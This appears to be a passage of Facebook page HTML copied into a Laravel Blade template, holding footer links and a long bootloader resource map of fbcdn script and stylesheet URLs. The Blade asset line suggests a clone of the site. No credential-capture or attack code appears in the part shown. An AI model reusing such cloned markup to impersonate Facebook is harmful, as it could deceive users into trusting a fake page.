                      href="https://facebook.com/settings"
                      title="View and edit your Facebook settings."
                      >Settings</a
                    >
                  </li>
                  <li>
                    <a
                      accesskey="7"
                      class="accessible_elem"
                      href="https://facebook.com/allactivity?privacy_source=activity_log_top_menu"
                      title="View your activity log"
                      >Activity log</a
                    >
                  </li>
                </ul>
              </div>
              <div class="mvl copyright">
                <div><span> Meta © 2022</span></div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div></div>
      <span
        ><img
          src="{{ asset('img/facebook/hsts-pixel.gif') }}"
          width="0"
          height="0"
          style="display: none"
      /></span>
    </div>
    <div style="display: none"></div>
    <script>
      requireLazy(["HasteSupportData"], function (m) {
        m.handle({
          bxData: {
            875231: {
              uri: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yD\/r\/d4ZIVX-5C-b.ico",
            },
          },
          gkxData: {
            4166: { result: false, hash: "AT7yrb5QuQ92736uHlk" },
            677762: { result: true, hash: "AT6e9MvRyXpacwOYlH4" },
            1908135: { result: false, hash: "AT6miGypJl3m2Aq47UE" },
            3959: { result: true, hash: "AT5An4B4pPVNHiK8S9E" },
            524: { result: false, hash: "AT6SLNReg1ijh3bZrQs" },
            819236: { result: false, hash: "AT66vW86d2uJ-kXPoHA" },
            12: { result: false, hash: "AT7MdxfOMhMQYcz0l9E" },
            1646: { result: false, hash: "AT4QD7x1GFNYajJZwfY" },
            3521: { result: false, hash: "AT6JXdAr_AL9yUh_IEM" },
            729631: { result: false, hash: "AT7b0tj8AHWG5lTFtmM" },
            1281505: { result: false, hash: "AT4PHZM9gFoypCjQcgw" },
            1291023: { result: false, hash: "AT519LseIG1nwq3o3-s" },
            1294182: { result: false, hash: "AT4vd6mwrtAJouEJZUU" },
            1399218: { result: true, hash: "AT6guCW1eyIkOV1EE_w" },
            1401060: { result: true, hash: "AT5aetN5Gb3reIXVOjE" },
            1485055: { result: true, hash: "AT5lkGxmhfrVKlcnS30" },
            1596063: { result: false, hash: "AT7JHuDWtaOqRuBUOn4" },
            1597642: { result: true, hash: "AT78G4fDXhlnMl7o65g" },
            1647260: { result: false, hash: "AT4WdkrQSGE5dIsEr7s" },
            1695831: { result: false, hash: "AT7RA6TJmDFGF-D6w7g" },
            1722014: { result: false, hash: "AT6_M5gpc6RLrHjcNto" },
            1742795: { result: false, hash: "AT6dbnY5JZm_bTIN-mg" },
            1778302: { result: false, hash: "AT65fisZhmc2X92EEHo" },
            1840809: { result: false, hash: "AT5nYctoTsr7alRiZIk" },
            1848749: { result: false, hash: "AT5GsH9Kb-3W-taZYnc" },
            1906871: { result: false, hash: "AT6dIBiVv9bUDXlmC0E" },
            1985945: { result: true, hash: "AT66Oo5lY__5wUTp8cI" },
            1099893: { result: false, hash: "AT5kly2LSZV_DKGRAOs" },
          },
          qexData: {
            644: { r: null },
            647: { r: null },
            648: { r: null },
            650: { r: null },
            651: { r: null },
          },
        });
      });
      requireLazy(["Bootloader"], function (m) {
        m.handlePayload({
          consistency: { rev: 1005083598 },
          rsrcMap: {
            ZaK7abM: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/UXJE_KFXmfT.js?_nc_x=Ij3Wp8lg5Kz",
            },
            s84NfZE: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/ymUKktuYtLv.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "UiX2b\/\/": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/r\/VjGUU0v9sW1.js?_nc_x=Ij3Wp8lg5Kz",
            },
            jpW6YKq: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ij9m4\/yY\/l\/en_GB\/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz",
            },
            VdF6ypd: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/PvBFn7IF58H.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "79Y8bmL": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iS9S4\/yv\/l\/en_GB\/gsc_cV2tO3j.js?_nc_x=Ij3Wp8lg5Kz",
            },
            GKQxLch: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/r\/TqFluosqNLr.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "Vlvz+ek": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/BJocMV4OuoF.js?_nc_x=Ij3Wp8lg5Kz",
            },
            TUxV68S: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/AEurEMwqHIo.js?_nc_x=Ij3Wp8lg5Kz",
            },
            nc2ZTn5: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/r\/YWyRTb_tcMn.js?_nc_x=Ij3Wp8lg5Kz",
            },
            WSN8hNl: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/w-Pc7DjVMKP.js?_nc_x=Ij3Wp8lg5Kz",
            },
            TNzeBoy: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3imhw4\/yv\/l\/en_GB\/mNBWBp-7bhm.js?_nc_x=Ij3Wp8lg5Kz",
            },
            w3Wk9lz: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iX3c4\/yw\/l\/en_GB\/I4Y6I3ClX-_.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "zA+yJGG": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iW4s4\/yS\/l\/en_GB\/mr8_Iyxpev9.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "2\/maQ\/Q": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/r\/R9lc5DaDrGJ.js?_nc_x=Ij3Wp8lg5Kz",
            },
            vhw5GRt: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yy\/r\/oXa106O6DQc.js?_nc_x=Ij3Wp8lg5Kz",
            },
            pndjTvI: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yB\/l\/0,cross\/QeLb7uUDzQU.css?_nc_x=Ij3Wp8lg5Kz",
            },
            R0lSirj: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/9rqFBr5eUp5.js?_nc_x=Ij3Wp8lg5Kz",
            },
            CGkH4FY: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yZ\/r\/x4Eyp9nQ1uk.js?_nc_x=Ij3Wp8lg5Kz",
            },
            BDpTGZx: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iYXl4\/yK\/l\/en_GB\/ordclcpLBon.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "Zr3joV+": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iPIv4\/ya\/l\/en_GB\/UcP_RFeMtnd.js?_nc_x=Ij3Wp8lg5Kz",
            },
            qIKb5tG: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/PkGOE4r3wcp.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "56VCh9H": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iFJJ4\/y7\/l\/en_GB\/2MZ45hnFKfR.js?_nc_x=Ij3Wp8lg5Kz",
            },
            lCiWnqM: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iNEW4\/y5\/l\/en_GB\/EN_hECBOZeR.js?_nc_x=Ij3Wp8lg5Kz",
            },
            fvoLBbw: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3itDX4\/yl\/l\/en_GB\/LUuhwfMmdHD.js?_nc_x=Ij3Wp8lg5Kz",
            },
            B6rkNZo: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i20w4\/yN\/l\/en_GB\/2kmV5RzQaVw.js?_nc_x=Ij3Wp8lg5Kz",
            },
            mI4DZcu: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/l\/0,cross\/PgW3OIHxbbF.css?_nc_x=Ij3Wp8lg5Kz",
            },
            "kyDs\/hf": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/r\/HnQOIcA4C2E.js?_nc_x=Ij3Wp8lg5Kz",
            },
            HISU2Y8: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iHTt4\/yv\/l\/en_GB\/ftep7inh4JA.js?_nc_x=Ij3Wp8lg5Kz",
            },
            OHMMTib: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ihHI4\/yW\/l\/en_GB\/Y6zwICk0Wiv.js?_nc_x=Ij3Wp8lg5Kz",
            },
            jyPWGxW: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yP\/r\/qn02T7x2VK0.js?_nc_x=Ij3Wp8lg5Kz",
            },
            PIDmGPV: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yB\/r\/t3Z8Oik78sr.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "YRCZ+m1": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yv\/r\/s_x5AY533bT.js?_nc_x=Ij3Wp8lg5Kz",
            },
            VtZ600j: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/l\/0,cross\/jcBDsGzLrJN.css?_nc_x=Ij3Wp8lg5Kz",
            },
            "0nrQV8U": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ifpJ4\/yL\/l\/en_GB\/mT31KzT8Cdl.js?_nc_x=Ij3Wp8lg5Kz",
            },
            TPVHIx9: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/r\/S57vNy7Bg69.js?_nc_x=Ij3Wp8lg5Kz",
            },
            i1M3L7z: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iaO64\/yN\/l\/en_GB\/yUl5tbHzG83.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "oW+j\/g+": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i6LZ4\/yK\/l\/en_GB\/Ff84Ld3PlK_.js?_nc_x=Ij3Wp8lg5Kz",
            },
            q16mIqM: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/r\/j9-c2LubgGK.js?_nc_x=Ij3Wp8lg5Kz",
            },
            d9ty0O5: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/HYqEQJiWbpi.js?_nc_x=Ij3Wp8lg5Kz",
            },
            y8o969v: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/y0\/l\/en_GB\/Fn_yFqfLjfm.js?_nc_x=Ij3Wp8lg5Kz",
            },
            F8jo2Dj: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3irej4\/yP\/l\/en_GB\/fmncLSscJ5M.js?_nc_x=Ij3Wp8lg5Kz",
            },
            iWdauk4: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y_\/r\/iO9gEAPCw4m.js?_nc_x=Ij3Wp8lg5Kz",
            },
            mgMxG66: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTQy4\/yy\/l\/en_GB\/JuTEMyDLunG.js?_nc_x=Ij3Wp8lg5Kz",
            },
            zVEN6sn: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yC\/r\/FmcD4lm55ny.js?_nc_x=Ij3Wp8lg5Kz",
            },
            jM4vQSb: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i9Zn4\/ya\/l\/en_GB\/rw7cqZ80HnK.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "+jRpToS": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/XDDAHSZfaR6.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "0BPrThy": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/UvKMDicj6Y_.js?_nc_x=Ij3Wp8lg5Kz",
            },
            Jujczgk: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iAgG4\/yc\/l\/en_GB\/hhbnH1uOcyN.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "6\/gN7tW": {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yp\/l\/0,cross\/A8rVk2oRs2x.css?_nc_x=Ij3Wp8lg5Kz",
            },
            PKrKxFl: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yF\/l\/0,cross\/flzyp0f7kgK.css?_nc_x=Ij3Wp8lg5Kz",
            },
            pLhJh6A: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/fKctVonJ1kq.js?_nc_x=Ij3Wp8lg5Kz",
            },
            kWILNCV: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iWdt4\/yG\/l\/en_GB\/zshAxruF_Ju.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "+HQDBGp": {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/l\/0,cross\/qnWmAARYgjf.css?_nc_x=Ij3Wp8lg5Kz",
            },
            "CXAPN\/1": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y1\/r\/jMdtFcG4LXC.js?_nc_x=Ij3Wp8lg5Kz",
            },
            CNG5DkE: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iztO4\/yt\/l\/en_GB\/HHMEOSFKRME.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "F\/p4sht": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/DPBVbTz2YCI.js?_nc_x=Ij3Wp8lg5Kz",
            },
            wwWSdab: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iZcV4\/yc\/l\/en_GB\/-ZN3z0eJ_EB.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "E+ty88w": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/Nr-PW96DUpT.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "UJAzhS\/": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/FubvKx--XXz.js?_nc_x=Ij3Wp8lg5Kz",
            },
            fmA3M6T: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/r\/MkXZ7P8-_wS.js?_nc_x=Ij3Wp8lg5Kz",
            },
            xLSSZ58: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/l\/0,cross\/qbXjzdf_c2T.css?_nc_x=Ij3Wp8lg5Kz",
            },
            C9AITxH: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/12z-HvWLcxJ.js?_nc_x=Ij3Wp8lg5Kz",
            },
            G2PzJgj: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yw\/l\/0,cross\/ZcW3x6JCwtn.css?_nc_x=Ij3Wp8lg5Kz",
            },
            rvsXwIm: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/r\/zKBeezL0ZAR.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "faOx+SK": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4Wl4\/y6\/l\/en_GB\/Ojk-vfgZKZ2.js?_nc_x=Ij3Wp8lg5Kz",
            },
            jj29UZB: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/r\/w5W7kbBpKe-.js?_nc_x=Ij3Wp8lg5Kz",
            },
            JcJMiIF: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ievZ4\/yQ\/l\/en_GB\/De9gZyw4Dbb.js?_nc_x=Ij3Wp8lg5Kz",
            },
            dsV5VvK: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yQ\/l\/0,cross\/lZ2emUOGiQ-.css?_nc_x=Ij3Wp8lg5Kz",
            },
            "9jeSk45": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iFVC4\/yD\/l\/en_GB\/SCBWxoK-dMc.js?_nc_x=Ij3Wp8lg5Kz",
            },
            diYp6Wz: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/l\/0,cross\/u-asER-WoyF.css?_nc_x=Ij3Wp8lg5Kz",
            },
            "nh8Q+On": {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/l\/0,cross\/UaB96RgkFSp.css?_nc_x=Ij3Wp8lg5Kz",
            },
            wxTMN2o: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yb\/r\/MjSmcVgJkeI.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "\/lt63Q3": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ihp64\/y_\/l\/en_GB\/MRIdLwfyZsb.js?_nc_x=Ij3Wp8lg5Kz",
            },
            PPDBUJb: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y7\/l\/0,cross\/VUkWSvZETxD.css?_nc_x=Ij3Wp8lg5Kz",
            },
            SrpP6vx: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/r\/bll4-7p4Ipj.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "L+z7QkP": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i7sB4\/ys\/l\/en_GB\/cU5Ipg33L72.js?_nc_x=Ij3Wp8lg5Kz",
            },
            m0x5Fgq: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ia624\/yT\/l\/en_GB\/nuI704fIYRr.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "LP\/Y1SY": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/Oayj55MrqrQ.js?_nc_x=Ij3Wp8lg5Kz",
            },
            lIaxUyf: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yp\/l\/0,cross\/3xy55d7B12p.css?_nc_x=Ij3Wp8lg5Kz",
            },
            ziJBX6X: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/l\/0,cross\/K8Se15eFFXN.css?_nc_x=Ij3Wp8lg5Kz",
            },
            BZq0Zvy: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/l\/0,cross\/cI41WpzL3XO.css?_nc_x=Ij3Wp8lg5Kz",
            },
            DD828tu: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yv\/l\/0,cross\/AQjRTCl0kW3.css?_nc_x=Ij3Wp8lg5Kz",
            },
            PogKv1z: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/IB7Ce3Vxnr4.js?_nc_x=Ij3Wp8lg5Kz",
            },
            TuiPcIO: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yO\/l\/0,cross\/ewAXCgN2oRp.css?_nc_x=Ij3Wp8lg5Kz",
            },
            oUzDp1n: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/r\/Oj_SrPfIWax.js?_nc_x=Ij3Wp8lg5Kz",
            },
            VJ1spXI: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y9\/r\/IeYqTRED2Dt.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "14CUPgD": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/r\/uh-d7eNv6zQ.js?_nc_x=Ij3Wp8lg5Kz",
            },
            s3WLiTz: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iwdk4\/yk\/l\/en_GB\/r43wcLCSNhe.js?_nc_x=Ij3Wp8lg5Kz",
            },
            C0n1piG: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yf\/r\/zMlPv7D8Cxl.js?_nc_x=Ij3Wp8lg5Kz",
            },
            oB5OdKl: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/l\/0,cross\/Fn1dHFZR3e1.css?_nc_x=Ij3Wp8lg5Kz",
            },
            hUzOO1y: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yM\/r\/BHgvyvWneli.js?_nc_x=Ij3Wp8lg5Kz",
            },
            J53Jy5d: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i1A04\/y7\/l\/en_GB\/bRW20I3MLTZ.js?_nc_x=Ij3Wp8lg5Kz",
            },
            aF9iPHd: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/yi\/l\/en_GB\/yMzqnohiu7a.js?_nc_x=Ij3Wp8lg5Kz",
            },
            MShROPU: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yR\/r\/6zWfLYER1_0.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "e2\/yV+b": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4EL4\/yw\/l\/en_GB\/L_3j9EDd07M.js?_nc_x=Ij3Wp8lg5Kz",
            },
            NaRov2Z: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i7xv4\/yH\/l\/en_GB\/iecet726DmQ.js?_nc_x=Ij3Wp8lg5Kz",
            },
            dLOHVPE: {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yb\/l\/0,cross\/M-L1ZzURyXQ.css?_nc_x=Ij3Wp8lg5Kz",
            },
            MtBBfeh: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ikyL4\/y1\/l\/en_GB\/Y7dp-9ngoD8.js?_nc_x=Ij3Wp8lg5Kz",
            },
            RncKcEA: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/yF\/l\/en_GB\/7OtqmB6ahzY.js?_nc_x=Ij3Wp8lg5Kz",
            },
            owsyghQ: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iSzN4\/yE\/l\/en_GB\/CoQZlOAS9ZO.js?_nc_x=Ij3Wp8lg5Kz",
            },
            FIWs9pb: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/DM5FMKCrhOI.js?_nc_x=Ij3Wp8lg5Kz",
            },
            NCuetvN: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i0BK4\/yG\/l\/en_GB\/loXKJj1n0jf.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "9V\/+6wi": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iAiU4\/yA\/l\/en_GB\/UjslSpfkkKz.js?_nc_x=Ij3Wp8lg5Kz",
            },
            u4NoyfU: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ibcU4\/y2\/l\/en_GB\/XnT0_qVBmx0.js?_nc_x=Ij3Wp8lg5Kz",
            },
            XmXQW8M: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iz8e4\/yD\/l\/en_GB\/8YNHB5UpFo4.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "PTs\/6Uy": {
              type: "css",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ya\/l\/0,cross\/QRwHK_hmJza.css?_nc_x=Ij3Wp8lg5Kz",
            },
            R7NyDOd: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iDSI4\/yw\/l\/en_GB\/1YoGkKpa_vu.js?_nc_x=Ij3Wp8lg5Kz",
            },
            tQpMpFd: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yb\/r\/WFtsgVQMYhy.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "hIek+bG": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/DZ_VBlsy-dC.js?_nc_x=Ij3Wp8lg5Kz",
            },
            qyPFONl: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/r\/p8J8gsseO9k.js?_nc_x=Ij3Wp8lg5Kz",
            },
            rRSeTc7: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTfb4\/y7\/l\/en_GB\/Tx_W2oOIH6A.js?_nc_x=Ij3Wp8lg5Kz",
            },
            x22Oby4: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/fN3cCj7Il4D.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "8ELCBwH": {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/VRzSVH5iU-V.js?_nc_x=Ij3Wp8lg5Kz",
            },
            Njh67P7: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3izZ-4\/yv\/l\/en_GB\/IOMvEhKlxaL.js?_nc_x=Ij3Wp8lg5Kz",
            },
            SWx3yNv: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/O_SjdcR-xKL.js?_nc_x=Ij3Wp8lg5Kz",
            },
            oE4DofT: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yJ\/r\/EejAgnHUad4.js?_nc_x=Ij3Wp8lg5Kz",
            },
            VvVFw8n: {
              type: "js",
              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/AWepvf-vdZG.js?_nc_x=Ij3Wp8lg5Kz",
            },
            "P\/mr5VE": {
              type: "css",
              src: "data:text\/css; charset=utf-8,\u002523bootloader_P_mr5VE{height:42px;}.bootloader_P_mr5VE{display:block!important;}",
              nc: 1,
              d: 1,
            },
          },
          compMap: {
            ODS: { r: ["ZaK7abM", "s84NfZE"], be: 1 },
            Dock: {
              r: [
                "UiX2b\/\/",
                "+xujYrB",
                "jpW6YKq",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "79Y8bmL",
                "tvWqIy4",
                "GKQxLch",
                "Vlvz+ek",
              ],
              be: 1,
            },
            WebSpeedInteractionsTypedLogger: {
              r: ["TUxV68S", "ZaK7abM", "s84NfZE", "nc2ZTn5"],
              rds: { m: ["BanzaiScuba_DEPRECATED"] },
              be: 1,
            },
            AsyncRequest: {
              r: ["jpW6YKq", "VdF6ypd", "ZaK7abM", "s84NfZE", "+xujYrB"],
              rds: {
                m: ["FbtLogging", "IntlQtEventFalcoEvent"],
                r: ["UiX2b\/\/"],
              },
              be: 1,
            },
            DOM: { r: ["s84NfZE", "+xujYrB"], be: 1 },
            Form: { r: ["WSN8hNl", "s84NfZE", "+xujYrB"], be: 1 },
            FormSubmit: {
              r: [
                "WSN8hNl",
                "jpW6YKq",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "TNzeBoy",
                "+xujYrB",
              ],
              rds: {
                m: [
                  "FbtLogging",
                  "IntlQtEventFalcoEvent",
                  "BanzaiScuba_DEPRECATED",
                ],
                r: ["UiX2b\/\/"],
              },
              be: 1,
            },
            Input: { r: ["WSN8hNl"], be: 1 },
            Live: {
              r: [
                "jpW6YKq",
                "ZaK7abM",
                "s84NfZE",
                "w3Wk9lz",
                "zA+yJGG",
                "2\/maQ\/Q",
                "+xujYrB",
              ],
              be: 1,
            },
            Toggler: {
              r: [
                "UiX2b\/\/",
                "+xujYrB",
                "jpW6YKq",
                "VdF6ypd",
                "ZaK7abM",
                "s84NfZE",
                "tvWqIy4",
                "GKQxLch",
                "Vlvz+ek",
              ],
              be: 1,
            },
            Tooltip: {
              r: [
                "vhw5GRt",
                "pndjTvI",
                "UiX2b\/\/",
